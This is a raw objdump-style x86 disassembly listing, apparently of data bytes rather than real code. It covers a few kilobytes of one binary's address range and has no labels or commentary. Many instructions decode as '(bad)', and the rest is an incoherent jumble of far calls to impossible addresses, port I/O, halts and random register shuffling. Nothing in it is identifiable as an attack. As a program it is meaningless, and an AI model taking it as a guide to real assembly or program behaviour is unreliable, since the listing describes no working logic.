  41f6f7:	test   BYTE PTR [esi],ah
  41f6f9:	cmp    BYTE PTR [ecx+esi*8-0x15],0x8e
  41f6fe:	ret    
  41f6ff:	add    al,0xda
  41f701:	add    bl,al
  41f703:	fcomp  QWORD PTR [eax]
  41f705:	gs pop edx
  41f707:	adc    eax,0x2e2370d5
  41f70c:	leave  
  41f70d:	pop    edx
  41f70e:	les    eax,FWORD PTR [ebx+0xfbdd949]
  41f714:	adc    BYTE PTR [ecx+0x37],bl
  41f717:	xchg   ecx,eax
  41f718:	shl    DWORD PTR [eax],cl
  41f71a:	dec    esi
  41f71b:	or     dh,al
  41f71d:	sbb    eax,0x67d0ca63
  41f722:	outs   dx,DWORD PTR ds:[esi]
  41f723:	repz mov ds:0x3ff7ab8,al
  41f729:	adc    bl,bl
  41f72b:	or     BYTE PTR [ecx],0x68
  41f72e:	mov    ds:0xbaf534d1,al
  41f733:	add    dh,BYTE PTR [edi]
  41f735:	xchg   bh,al
  41f737:	adc    BYTE PTR [ebp-0x67],bh
  41f73a:	mov    esi,DWORD PTR [edx+0x73db64a1]
  41f740:	jb     0x41f70e
  41f742:	adc    eax,0x122a3b42
  41f747:	(bad)  
  41f749:	aaa    
  41f74a:	dec    edx
  41f74b:	mov    eax,ds:0x33199ae6
  41f750:	sub    BYTE PTR [eax+0x45],dh
  41f753:	jnp    0x41f7d2
  41f755:	je     0x41f6e5
  41f757:	test   eax,0xb81a653e
  41f75c:	push   0x56
  41f75e:	cmp    ebp,ebp
  41f760:	jb     0x41f7c9
  41f762:	push   ds
  41f763:	push   ecx
  41f764:	inc    si
  41f766:	sbb    al,0xd4
  41f768:	or     bl,BYTE PTR [esi+0x1d61a4a8]
  41f76e:	shl    DWORD PTR [edi+0x56f2df97],0x7c
  41f775:	pop    ds
  41f776:	pop    es
  41f777:	loope  0x41f718
  41f779:	push   es
  41f77a:	dec    edx
  41f77b:	xor    ebp,DWORD PTR [ecx]
  41f77d:	imul   eax,eax,0xfffffffa
  41f780:	and    DWORD PTR [esp+ecx*2],0x21
  41f784:	cmp    eax,0x5b1eee55
  41f789:	sub    esi,edx
  41f78b:	mov    BYTE PTR [eax+ebx*1],bl
  41f78e:	in     eax,0x2c
  41f790:	xchg   esi,eax
  41f791:	sbb    DWORD PTR [ebp+ebx*4-0x214a658a],0x39f4def7
  41f79c:	mov    dl,0xa0
  41f79e:	rep ins BYTE PTR es:[edi],dx
  41f7a0:	(bad)  [eax]
  41f7a2:	retf   
  41f7a3:	sahf   
  41f7a4:	add    bl,BYTE PTR [ecx+0x6d0fe7d5]
  41f7aa:	les    edx,FWORD PTR [ebx]
  41f7ac:	inc    ebp
  41f7ad:	jns    0x41f745
  41f7af:	xchg   ebx,eax
  41f7b0:	adc    DWORD PTR [ecx],0xbd46ef8d
  41f7b6:	and    BYTE PTR [esp+edi*8+0x371d74c1],bl
  41f7bd:	aaa    
  41f7be:	call   0x8b220b25
  41f7c3:	and    BYTE PTR [edx+eax*4],bl
  41f7c6:	ins    BYTE PTR es:[edi],dx
  41f7c7:	sbb    edx,eax
  41f7c9:	add    DWORD PTR [esi],ebx
  41f7cb:	pop    ecx
  41f7cc:	adc    DWORD PTR [eax-0xbc6550b],ebp
  41f7d2:	(bad)  
  41f7d3:	adc    al,0x35
  41f7d5:	pop    es
  41f7d6:	sub    ah,BYTE PTR [eax+0x23]
  41f7d9:	lods   al,BYTE PTR ds:[esi]
  41f7da:	or     edi,ecx
  41f7dc:	sahf   
  41f7dd:	in     al,dx
  41f7de:	test   DWORD PTR [ecx-0x1e],edx
  41f7e1:	dec    ebx
  41f7e2:	imul   BYTE PTR [esi-0x671946eb]
  41f7e8:	mov    cl,0xde
  41f7ea:	sbb    bl,BYTE PTR [ecx-0x46]
  41f7ed:	jae    0x41f854
  41f7ef:	cwde   
  41f7f0:	fs sbb ch,dh
  41f7f3:	nop
  41f7f4:	shl    DWORD PTR [ebx],0x4f
  41f7f7:	adc    ebx,ecx
  41f7f9:	jno    0x41f852
  41f7fb:	mov    esi,0x5fb3dc47
  41f800:	push   edx
  41f801:	sbb    DWORD PTR [ecx-0x2fbdec29],ecx
  41f807:	fsub   DWORD PTR [ebp+eiz*1-0x42]
  41f80b:	call   0x662c0f7c
  41f810:	loope  0x41f7dc
  41f812:	cwde   
  41f813:	jge    0x41f87b
  41f815:	fwait
  41f816:	mov    ecx,edi
  41f818:	xchg   edi,eax
  41f819:	xor    eax,0xae92b369
  41f81e:	xor    bl,BYTE PTR [edx]
  41f820:	or     al,ah
  41f822:	ins    BYTE PTR es:[edi],dx
  41f823:	push   edi
  41f824:	sub    BYTE PTR [ebx-0x4c],bl
  41f827:	xor    ecx,edx
  41f829:	inc    ebp
  41f82a:	into   
  41f82b:	pushf  
  41f82c:	cmp    eax,0x36c61ed
  41f831:	lds    edi,FWORD PTR [ebp-0x44]
  41f834:	mov    ecx,0x3208b539
  41f839:	mov    edi,0xb36dfa07
  41f83e:	scas   al,BYTE PTR es:[edi]
  41f83f:	test   DWORD PTR [eax],ebp
  41f841:	cmp    al,0x5f
  41f843:	sbb    BYTE PTR [ecx-0x27],bh
  41f846:	rcl    BYTE PTR [esi-0x17f9796d],1
  41f84c:	jp     0x41f84a
  41f84e:	mov    ?,WORD PTR [esi-0xbf35fa0]
  41f854:	iret   
  41f855:	or     edx,0x1c
  41f858:	sar    DWORD PTR [ebx],cl
  41f85a:	jmp    0x41f885
  41f85c:	pop    ecx
  41f85d:	sub    eax,0x5f4e96e0
  41f862:	sar    bl,0xb3
  41f865:	cwde   
  41f866:	jle    0x41f8e1
  41f868:	jbe    0x41f879
  41f86a:	cmp    eax,0x274f0f9c
  41f86f:	repz (bad) 
  41f872:	(bad)  
  41f873:	push   edi
  41f874:	fs mov bl,0xe1
  41f877:	ins    BYTE PTR es:[edi],dx
  41f878:	mov    ebp,0x15273e42
  41f87d:	mov    bh,0xf1
  41f87f:	rol    DWORD PTR [esi+0xd],0xc
  41f883:	cwde   
  41f884:	add    al,0x6
  41f886:	lods   eax,DWORD PTR ds:[esi]
  41f887:	loop   0x41f8c9
  41f889:	sahf   
  41f88a:	(bad)  
  41f88b:	or     al,0x4
  41f88d:	das    
  41f88e:	test   ebp,0x3da5a4ac
  41f894:	repz push ecx
  41f896:	mov    edx,0xac2af179
  41f89b:	mov    ecx,0x50cb6463
  41f8a0:	retf   0xdfbd
  41f8a3:	mov    eax,ds:0xbdcffced
  41f8a8:	out    dx,eax
  41f8a9:	fdivr  QWORD PTR [edx+ebx*1]
  41f8ac:	(bad)  
  41f8ad:	mov    cl,0xd5
  41f8af:	ret    
  41f8b0:	xor    al,0x35
  41f8b2:	pusha  
  41f8b3:	shl    DWORD PTR [ebx],cl
  41f8b5:	push   es
  41f8b6:	sbb    esi,ebx
  41f8b8:	popf   
  41f8b9:	mov    ebp,0x6d19c66f
  41f8be:	loopne 0x41f8f1
  41f8c0:	repz not BYTE PTR [eax+0x7ec39be7]
  41f8c7:	mov    eax,0xf2817327
  41f8cc:	clc    
  41f8cd:	and    edx,DWORD PTR [edi+0x3a]
  41f8d0:	sbb    eax,0x57e9860e
  41f8d5:	repnz xchg esp,eax
  41f8d7:	ins    DWORD PTR es:[edi],dx
  41f8d8:	jne    0x41f8d9
  41f8da:	bound  esp,QWORD PTR [eax-0x6861d0a6]
  41f8e0:	repnz xor esi,DWORD PTR [ecx+0x5f]
  41f8e4:	cmc    
  41f8e5:	mov    al,ah
  41f8e7:	leave  
  41f8e8:	dec    edi
  41f8e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8ea:	pop    ebp
  41f8eb:	sar    bh,cl
  41f8ed:	call   0xaa40:0xb0b3e07a
  41f8f4:	sub    DWORD PTR [eax],esi
  41f8f6:	test   eax,0x381424d1
  41f8fb:	ja     0x41f94e
  41f8fd:	test   BYTE PTR [edx+0x6004dd15],0x73
  41f904:	push   0x59
  41f906:	test   DWORD PTR [edi],ebx
  41f908:	sub    dh,BYTE PTR [ebp+ebx*8+0x4e6c749]
  41f90f:	inc    ebx
  41f910:	xlat   BYTE PTR ds:[ebx]
  41f911:	mov    ds:0xd7230460,al
  41f916:	fwait
  41f917:	outs   dx,BYTE PTR ds:[esi]
  41f918:	clc    
  41f919:	lea    ecx,[esi]
  41f91b:	xchg   esi,eax
  41f91c:	xchg   DWORD PTR [eax+0x7b],edi
  41f91f:	mov    DWORD PTR [eax+0x5f],eax
  41f922:	and    eax,0x99f2bf2
  41f927:	js     0x41f8ba
  41f929:	cli    
  41f92a:	dec    esp
  41f92b:	loope  0x41f920
  41f92d:	push   0xffffff99
  41f92f:	mov    ebx,0xc826bc23
  41f934:	or     bh,ch
  41f936:	mul    DWORD PTR [ebx-0x60f92706]
  41f93c:	lea    eax,[edx]
  41f93e:	sub    eax,0xc5d36d59
  41f943:	push   ecx
  41f944:	fwait
  41f945:	jns    0x41f99a
  41f947:	pop    edi
  41f948:	fstp   QWORD PTR [ebx+0x68412c2f]
  41f94e:	add    BYTE PTR [ebp-0x4e475814],cl
  41f954:	retf   
  41f955:	mov    esi,0x309b41b0
  41f95a:	ret    0x5e1f
  41f95d:	mov    ah,0x4
  41f95f:	jae    0x41f8ed
  41f961:	aam    0xf4
  41f963:	fidivr DWORD PTR [ecx]
  41f965:	stc    
  41f966:	dec    esp
  41f967:	outs   dx,BYTE PTR ds:[esi]
  41f968:	jg     0x41f9b1
  41f96a:	pop    eax
  41f96b:	imul   BYTE PTR [esi]
  41f96d:	scas   al,BYTE PTR es:[edi]
  41f96e:	mov    ds:0xdf9de883,eax
  41f973:	rcl    BYTE PTR [ebx+0x22],0x1
  41f977:	aad    0xdc
  41f979:	in     al,dx
  41f97a:	cs push ebp
  41f97c:	sub    ecx,DWORD PTR ds:0x6ca1c3cf
  41f982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f983:	ins    BYTE PTR es:[edi],dx
  41f984:	push   esp
  41f985:	xchg   ebp,eax
  41f986:	add    eax,0x7cecf4dc
  41f98b:	fsub   QWORD PTR [esi-0x30]
  41f98e:	(bad)  
  41f98f:	popa   
  41f990:	push   0x65
  41f992:	test   bl,0x76
  41f995:	out    dx,eax
  41f996:	pop    ebp
  41f997:	push   esp
  41f998:	jp     0x41f929
  41f99a:	push   edx
  41f99b:	aaa    
  41f99c:	pop    edi
  41f99d:	iret   
  41f99e:	cdq    
  41f99f:	int    0x74
  41f9a1:	push   edi
  41f9a2:	add    al,0x73
  41f9a4:	cmp    al,0x7
  41f9a6:	aas    
  41f9a7:	into   
  41f9a8:	inc    edi
  41f9a9:	jno    0x41fa11
  41f9ab:	mov    dh,0x9e
  41f9ad:	pinsrw mm7,WORD PTR [eax-0x48],0x87
  41f9b2:	in     eax,0x99
  41f9b4:	fld    TBYTE PTR [ecx-0x38]
  41f9b7:	fs jecxz 0x41f9bb
  41f9ba:	pop    edx
  41f9bb:	inc    ebp
  41f9bc:	push   0x5d
  41f9be:	mov    ebx,DWORD PTR [eax+0x2e]
  41f9c1:	mov    esp,0xe68e500e
  41f9c6:	je     0x41f99c
  41f9c8:	dec    eax
  41f9c9:	or     cl,BYTE PTR [ebx-0x80]
  41f9cc:	ret    0xfc51
  41f9cf:	xlat   BYTE PTR ds:[ebx]
  41f9d0:	(bad)  
  41f9d1:	pop    es
  41f9d2:	int    0x68
  41f9d4:	and    al,0xe8
  41f9d6:	mov    DWORD PTR [edx-0x40],ecx
  41f9d9:	pop    ebx
  41f9da:	push   ebp
  41f9db:	and    dl,BYTE PTR [ebp+0x5b7ed493]
  41f9e1:	popa   
  41f9e2:	mov    edi,0x320bf69b
  41f9e7:	jge    0x41f9c7
  41f9e9:	jae    0x41f99a
  41f9eb:	or     ah,0x4b
  41f9ee:	inc    ebx
  41f9ef:	(bad)  
  41f9f0:	mov    edi,0x57cb489a
  41f9f5:	jl     0x41fa72
  41f9f7:	sbb    DWORD PTR [ebp-0x14],ebx
  41f9fa:	push   ebx
  41f9fb:	jb     0x41fa28
  41f9fd:	push   ebp
  41f9fe:	xchg   ebp,eax
  41f9ff:	mov    ah,0xed
  41fa01:	(bad)  
  41fa02:	dec    edx
  41fa03:	cmp    BYTE PTR [edx-0x7327bc74],al
  41fa09:	out    0xc3,eax
  41fa0b:	mul    DWORD PTR [ebx+0x47]
  41fa0e:	cmp    edi,DWORD PTR [edi-0x21e7e453]
  41fa14:	mov    ebx,0xe8b6426
  41fa19:	xor    BYTE PTR [ecx],bh
  41fa1b:	lods   al,BYTE PTR ds:[esi]
  41fa1c:	and    ebx,edi
  41fa1e:	mov    edi,0x9e86ba
  41fa23:	int    0xb6
  41fa25:	(bad)  
  41fa27:	imul   esp,DWORD PTR [edi-0x64],0xe5996a42
  41fa2e:	dec    ecx
  41fa2f:	xchg   esi,eax
  41fa30:	mov    ah,0x94
  41fa32:	pop    edi
  41fa33:	mov    ds,WORD PTR [ecx]
  41fa35:	ret    
  41fa36:	dec    esi
  41fa37:	jno    0x41fa8d
  41fa39:	call   0x3f79:0x1f9260fd
  41fa40:	(bad)  
  41fa41:	in     eax,dx
  41fa42:	dec    esi
  41fa43:	in     al,dx
  41fa44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa45:	ins    BYTE PTR es:[edi],dx
  41fa46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa47:	dec    esp
  41fa48:	mov    bl,0x2f
  41fa4a:	adc    DWORD PTR [ebp+0x45],edi
  41fa4d:	inc    esi
  41fa4e:	mov    ch,0x3e
  41fa50:	sti    
  41fa51:	inc    eax
  41fa52:	sub    dl,bh
  41fa54:	imul   ecx,DWORD PTR [esi+0x3b],0xfffffff2
  41fa58:	out    0xa8,al
  41fa5a:	mov    ecx,0xab0da257
  41fa5f:	cdq    
  41fa60:	sbb    al,BYTE PTR [esp+ecx*2+0x51]
  41fa64:	sti    
  41fa65:	and    ebx,DWORD PTR [ebp+0x3672b0f]
  41fa6b:	inc    ebx
  41fa6c:	mov    BYTE PTR [edx],dl
  41fa6e:	sbb    al,0xfe
  41fa70:	or     al,0x8e
  41fa72:	(bad)  
  41fa73:	icebp  
  41fa74:	cmp    ebp,edi
  41fa76:	dec    eax
  41fa77:	(bad)  
  41fa78:	jbe    0x41fa7e
  41fa7a:	jbe    0x41fac1
  41fa7c:	push   0x59d6a58f
  41fa81:	hlt    
  41fa82:	pop    edx
  41fa83:	rcl    BYTE PTR [ecx],0xa0
  41fa86:	lahf   
  41fa87:	jns    0x41fafc
  41fa89:	mov    ds:0xcdbc085e,al
  41fa8e:	cdq    
  41fa8f:	xor    esp,DWORD PTR [edi-0x66]
  41fa92:	(bad)  
  41fa93:	sub    DWORD PTR [eax+0x6d37d30],esi
  41fa99:	lock arpl WORD PTR [ebx-0x34af3df3],sp
  41faa0:	popf   
  41faa1:	inc    ebx
  41faa2:	mov    al,BYTE PTR [ebp+0xf60ae47]
  41faa8:	push   cs
  41faa9:	fwait
  41faaa:	inc    ebp
  41faab:	fldcw  WORD PTR [edi-0x3a8ca1bc]
  41fab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab2:	cld    
  41fab3:	push   ebp
  41fab4:	inc    esp
  41fab5:	xor    DWORD PTR [ebx],edi
  41fab7:	(bad)  
  41fab8:	cmc    
  41fab9:	mov    bh,al
  41fabb:	aas    
  41fabc:	pop    ss
  41fabd:	stc    
  41fabe:	jp     0x41faec
  41fac0:	adc    edx,DWORD PTR [ecx+ebp*4-0x25]
  41fac4:	in     eax,0xa
  41fac6:	scas   eax,DWORD PTR es:[edi]
  41fac7:	jecxz  0x41fab9
  41fac9:	das    
  41faca:	arpl   bp,bx
  41facc:	scas   eax,DWORD PTR es:[edi]
  41facd:	cmp    dl,dl
  41facf:	mov    al,dl
  41fad1:	xor    DWORD PTR [edi],0x35d381ab
  41fad7:	adc    al,0x8f
  41fad9:	mov    eax,ds:0xd6b288cd
  41fade:	repnz adc DWORD PTR [ebp+0x0],ebp
  41fae5:	add    BYTE PTR [eax],al
  41fae7:	add    BYTE PTR [eax],al
  41fae9:	add    BYTE PTR [eax+0x4a],bl
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	lods   eax,DWORD PTR ds:[esi]
  41faf7:	cmp    DWORD PTR [ebp-0x36],ebx
  41fafa:	dec    esi
  41fafb:	mov    al,BYTE PTR [ecx]
  41fafd:	add    BYTE PTR [edi+0x6],bh
  41fb00:	add    BYTE PTR [eax],al
  41fb02:	inc    ecx
  41fb03:	repnz xchg edi,eax
  41fb05:	ins    BYTE PTR es:[edi],dx
  41fb06:	daa    
  41fb07:	pop    es
  41fb08:	jg     0x41fb15
  41fb0a:	add    ebx,DWORD PTR [edi]
  41fb0c:	ins    BYTE PTR es:[edi],dx
  41fb0d:	or     ch,BYTE PTR [esi]
  41fb0f:	adc    eax,0xd6b5585c
  41fb14:	test   al,dh
  41fb16:	and    DWORD PTR [ebx],0x4c969874
  41fb1c:	adc    al,0xc6
  41fb1e:	aaa    
  41fb1f:	bound  ecx,QWORD PTR [ebp-0x67731eb1]
  41fb25:	nop
  41fb26:	sub    BYTE PTR [ebp+0x692816d9],bh
  41fb2c:	sbb    edi,ebp
  41fb2e:	xor    al,0xa
  41fb30:	cmp    eax,0x7d0791a6
  41fb35:	cs jle 0x41fb47
  41fb38:	stc    
  41fb39:	les    ebx,FWORD PTR [edx-0x9]
  41fb3c:	(bad)  
  41fb3d:	ja     0x41fbb4
  41fb3f:	xchg   esi,eax
  41fb41:	jge    0x41fb87
  41fb43:	(bad)  
  41fb44:	jns    0x41fb86
  41fb46:	std    
  41fb47:	add    DWORD PTR [ebp+0x29ec558b],0xe2d2034f
  41fb51:	out    dx,al
  41fb52:	js     0x41fb36
  41fb54:	jecxz  0x41fb27
  41fb56:	icebp  
  41fb57:	mov    ebx,0x438653b6
  41fb5c:	dec    ebp
  41fb5d:	outs   dx,DWORD PTR ds:[esi]
  41fb5e:	xchg   BYTE PTR [ebp-0x6a9ab07a],bh
  41fb64:	dec    esp
  41fb66:	jb     0x41faea
  41fb68:	ror    BYTE PTR [ecx],0x26
  41fb6b:	jbe    0x41fb40
  41fb6d:	jmp    0x41fb03
  41fb6f:	outs   dx,DWORD PTR ds:[esi]
  41fb70:	cmc    
  41fb71:	test   BYTE PTR [ebx-0x4e81f12],ah
  41fb77:	js     0x41fb06
  41fb79:	push   edi
  41fb7a:	cmp    eax,0xcd8c8c25
  41fb7f:	add    ecx,DWORD PTR [esi+0x7ad82375]
  41fb85:	jmp    0x4ca2295c
  41fb8a:	sbb    ebp,DWORD PTR [ebp+0x65]
  41fb8d:	sub    DWORD PTR [ecx-0x7d],edi
  41fb90:	and    eax,0x951d2fa7
  41fb95:	mov    bh,0x1e
  41fb97:	mov    ebx,esi
  41fb99:	(bad)  
  41fb9a:	jp     0x41fb30
  41fb9c:	xchg   edx,eax
  41fb9d:	es add dl,cl
  41fba0:	test   cl,bh
  41fba2:	adc    BYTE PTR [edx+edx*2],cl
  41fba5:	push   edx
  41fba6:	jl     0x41fc1d
  41fba8:	mov    al,ds:0x1cf1feb4
  41fbad:	ins    BYTE PTR es:[edi],dx
  41fbae:	cmp    DWORD PTR [edx+edx*4-0x77],0xb92b2599
  41fbb6:	add    eax,0x1624d028
  41fbbb:	cmp    ebx,DWORD PTR [ecx-0x43326eff]
  41fbc1:	mov    bl,ch
  41fbc3:	inc    ecx
  41fbc4:	jle    0x41fc19
  41fbc6:	xor    al,0xef
  41fbc8:	loopne 0x41fb5f
  41fbca:	in     al,0x28
  41fbcc:	call   esi
  41fbce:	mov    bh,0x90
  41fbd0:	pop    ebx
  41fbd1:	nop
  41fbd2:	jae    0x41fbf6
  41fbd4:	test   BYTE PTR [edi+0x7d192af8],cl
  41fbda:	out    dx,al
  41fbdb:	out    0xe6,al
  41fbdd:	mov    al,0x29
  41fbdf:	adc    ecx,DWORD PTR [edi]
  41fbe1:	jl     0x41fbd3
  41fbe3:	adc    DWORD PTR [edx+ebp*2],edx
  41fbe6:	ret    
  41fbe7:	loope  0x41fbcb
  41fbe9:	sub    eax,0xbd19b149
  41fbee:	jmp    0x41fb74
  41fbf0:	mov    BYTE PTR [edi-0x647aa9e9],ch
  41fbf6:	std    
  41fbf7:	into   
  41fbf8:	in     al,dx
  41fbf9:	adc    al,0x4f
  41fbfb:	and    ebp,DWORD PTR [ebx+0x7a3b8b3a]
  41fc01:	sti    
  41fc02:	retf   0xbbdb
  41fc05:	mov    edi,0xdd769ce5
  41fc0a:	mov    cl,dl
  41fc0c:	inc    esp
  41fc0d:	and    bh,bl
  41fc0f:	out    dx,al
  41fc10:	test   eax,0x76abb13d
  41fc15:	dec    edx
  41fc16:	sbb    DWORD PTR [esi],esp
  41fc18:	ror    BYTE PTR [ecx-0x7d],cl
  41fc1b:	jmp    0x2bba6943
  41fc20:	lock aad 0x84
  41fc23:	in     eax,dx
  41fc24:	inc    edi
  41fc25:	and    al,0x6f
  41fc27:	or     DWORD PTR ds:0x88fdbe40,ebx
  41fc2d:	arpl   WORD PTR [edx+0x5f],bp
  41fc30:	jae    0x41fc48
  41fc32:	cmp    DWORD PTR [esi],edi
  41fc34:	xchg   DWORD PTR [edx-0xba85b96],esp
  41fc3a:	xchg   BYTE PTR [eax-0x4b],ah
  41fc3d:	stos   DWORD PTR es:[edi],eax
  41fc3e:	add    DWORD PTR [esi+0x38],0xffffffe2
  41fc42:	adc    DWORD PTR ds:0xd950019d,esi
  41fc48:	retf   
  41fc49:	sbb    dh,BYTE PTR [esi+eax*8]
  41fc4c:	scas   al,BYTE PTR es:[edi]
  41fc4d:	and    al,0xa3
  41fc4f:	not    eax
  41fc51:	push   edx
  41fc52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc53:	fwait
  41fc54:	inc    ebx
  41fc55:	xor    BYTE PTR [esi],al
  41fc57:	sub    BYTE PTR [ecx-0x42006f35],dl
  41fc5d:	mov    esp,0x250fa550
  41fc62:	jne    0x41fc2f
  41fc64:	cli    
  41fc65:	loop   0x41fcc0
  41fc67:	jae    0x41fc38
  41fc69:	clc    
  41fc6a:	dec    ebp
  41fc6b:	cmp    al,0x36
  41fc6d:	mov    al,0x97
  41fc6f:	arpl   WORD PTR [esi+ebx*8],cx
  41fc72:	mov    bh,0x90
  41fc74:	xlat   BYTE PTR ds:[ebx]
  41fc75:	xchg   ebp,eax
  41fc76:	ss jp  0x41fc0f
  41fc79:	xchg   edi,eax
  41fc7a:	jbe    0x41fc69
  41fc7c:	dec    ebx
  41fc7d:	mov    ah,0x87
  41fc7f:	sub    al,0xf6
  41fc81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc82:	cs and al,0x2e
  41fc85:	and    eax,0x23f582a2
  41fc8a:	add    dl,BYTE PTR [edx+eax*1]
  41fc8d:	icebp  
  41fc8e:	fdivr  QWORD PTR [edx-0x1b]
  41fc91:	loopne 0x41fc38
  41fc93:	int3   
  41fc94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc96:	add    ebx,DWORD PTR [edi+0x72]
  41fc99:	jp     0x41fca7
  41fc9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc9c:	fisub  DWORD PTR [eax+0x4b]
  41fc9f:	mov    edi,0xfc38f6ae
  41fca4:	ret    
  41fca5:	xchg   edx,eax
  41fca6:	jno    0x41fca5
  41fca8:	stos   DWORD PTR es:[edi],eax
  41fca9:	pop    ds
  41fcaa:	sub    DWORD PTR cs:[eax+eiz*4-0x8d5d0a4],esp
  41fcb2:	stos   BYTE PTR es:[edi],al
  41fcb3:	push   cs
  41fcb4:	xor    eax,0x79ac8883
  41fcb9:	and    esi,esi
  41fcbb:	add    al,0x81
  41fcbd:	stc    
  41fcbe:	adc    cl,BYTE PTR [ecx+0x31]
  41fcc1:	inc    edx
  41fcc2:	push   eax
  41fcc3:	mov    al,0x66
  41fcc5:	sbb    cl,BYTE PTR [edx-0x65]
  41fcc8:	sub    BYTE PTR [edi+ecx*2],ch
  41fccb:	(bad)  [ebx]
  41fccd:	(bad)  
  41fcce:	mov    dh,0xc
  41fcd0:	out    0x4e,eax
  41fcd2:	dec    edx
  41fcd3:	cmp    BYTE PTR [ecx+0x28],dh
  41fcd6:	adc    edx,DWORD PTR [edx-0x2cadaacd]
  41fcdc:	nop
  41fcdd:	sbb    eax,0x90ecc2e9
  41fce2:	loop   0x41fcea
  41fce4:	jp     0x41fd31
  41fce6:	popa   
  41fce7:	cmp    al,0xdf
  41fce9:	sbb    BYTE PTR [ebx],dh
  41fceb:	sub    ebp,DWORD PTR ds:0x21f1c916
  41fcf1:	mov    bh,0x7c
  41fcf3:	loope  0x41fcba
  41fcf5:	ficomp WORD PTR [esi+0x16]
  41fcf8:	stos   BYTE PTR es:[edi],al
  41fcf9:	sub    al,BYTE PTR [edi]
  41fcfb:	je     0x41fd2e
  41fcfd:	js     0x41fce7
  41fcff:	ins    BYTE PTR es:[edi],dx
  41fd00:	cmc    
  41fd01:	fisubr WORD PTR [eax]
  41fd03:	jmp    0x41fd3c
  41fd05:	mov    al,ds:0x144e46e4
  41fd0a:	aam    0x39
  41fd0c:	adc    edi,DWORD PTR [esi+0x608e0a30]
  41fd12:	int3   
  41fd13:	inc    edx
  41fd14:	shl    BYTE PTR [esi+0x58],cl
  41fd17:	xor    DWORD PTR [esi+0x5e4a51be],esi
  41fd1d:	jge    0x41fd52
  41fd1f:	cmp    al,0x96
  41fd21:	lods   eax,DWORD PTR ds:[esi]
  41fd22:	arpl   WORD PTR [ebp+0x1722b19a],dx
  41fd28:	gs xchg edx,eax
  41fd2a:	pop    ss
  41fd2b:	or     bh,BYTE PTR [edx]
  41fd2d:	loopne 0x41fd8f
  41fd2f:	jne    0x41fd21
  41fd31:	jp     0x41fd3f
  41fd33:	mov    ecx,0x34b36d49
  41fd38:	push   ecx
  41fd39:	cmc    
  41fd3a:	inc    ebp
  41fd3b:	xor    al,0x9c
  41fd3d:	sub    al,0x8e
  41fd3f:	pop    esp
  41fd40:	clc    
  41fd41:	jp     0x41fd2c
  41fd43:	inc    ebp
  41fd44:	pop    esp
  41fd45:	ins    DWORD PTR es:[edi],dx
  41fd46:	xchg   DWORD PTR [esi+0x38992d89],esp
  41fd4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd4d:	xor    al,0x73
  41fd4f:	mov    edi,0xd4088754
  41fd54:	mov    cl,0x89
  41fd56:	and    esp,ebx
  41fd58:	adc    al,0xdc
  41fd5a:	loopne 0x41fdd8
  41fd5c:	ficomp WORD PTR [eax+0x28]
  41fd5f:	fwait
  41fd60:	repz xchg esp,eax
  41fd62:	sub    edx,eax
  41fd64:	mov    ah,0xf
  41fd66:	stc    
  41fd67:	cs dec esp
  41fd69:	push   ds
  41fd6a:	aam    0xda
  41fd6c:	ret    
  41fd6d:	mov    esp,0xc326b8c
  41fd72:	aas    
  41fd73:	xor    dl,cl
  41fd75:	nop
  41fd76:	cmp    ch,ch
  41fd78:	push   esi
  41fd79:	mov    ds:0x73d5992c,eax
  41fd7e:	(bad)  
  41fd7f:	sub    al,0xc0
  41fd81:	or     edi,DWORD PTR [esi-0x3c2b369a]
  41fd87:	inc    ebp
  41fd88:	retf   0x2fcb
  41fd8b:	xchg   DWORD PTR [esi+edx*2],esp
  41fd8e:	add    al,0xa2
  41fd90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd91:	dec    esi
  41fd92:	imul   ecx,ebx,0xffffff88
  41fd95:	cmp    eax,0xe5fa383f
  41fd9a:	xchg   edi,eax
  41fd9b:	jbe    0x41fdf2
  41fd9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd9e:	cmc    
  41fd9f:	xor    eax,0xdcfd2403
  41fda4:	sub    BYTE PTR ds:0x3198a8f9,al
  41fdaa:	int3   
  41fdab:	pop    ss
  41fdac:	cs call 0x329d:0xcd5155bd
  41fdb4:	pop    esp
  41fdb5:	inc    eax
  41fdb6:	daa    
  41fdb7:	add    al,0x3
  41fdb9:	ror    dl,1
  41fdbb:	adc    DWORD PTR [edx],esi
  41fdbd:	ins    BYTE PTR es:[edi],dx
  41fdbe:	mov    ebx,0x6e8f7758
  41fdc3:	retf   0x4391
  41fdc6:	daa    
  41fdc7:	push   ds
  41fdc8:	(bad)  
  41fdca:	lods   al,BYTE PTR ds:[esi]
  41fdcb:	(bad)  
  41fdcc:	pop    esi
  41fdcd:	dec    esp
  41fdce:	ret    0xcdd1
  41fdd1:	mov    ebx,0x154518b4
  41fdd6:	sub    bh,BYTE PTR [esi+0x68a1c0f1]
  41fddc:	add    ebx,DWORD PTR [ebp-0x30ac6d61]
  41fde2:	mov    ah,0x95
  41fde4:	xor    DWORD PTR [ecx-0x51a6bad5],edi
  41fdea:	cmp    ecx,DWORD PTR [edx+0xe2d1ecd]
  41fdf0:	and    dh,BYTE PTR [bx+si-0x26]
  41fdf4:	fwait
  41fdf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdf6:	test   al,0xb0
  41fdf8:	pop    edx
  41fdf9:	push   edx
  41fdfa:	fs xchg esi,eax
  41fdfc:	rol    BYTE PTR [edx],1
  41fdfe:	and    edx,eax
  41fe00:	push   edx
  41fe01:	adc    BYTE PTR [edi+edx*8],al
  41fe04:	mov    ah,0xcc
  41fe06:	inc    edx
  41fe07:	dec    esp
  41fe08:	xchg   edi,eax
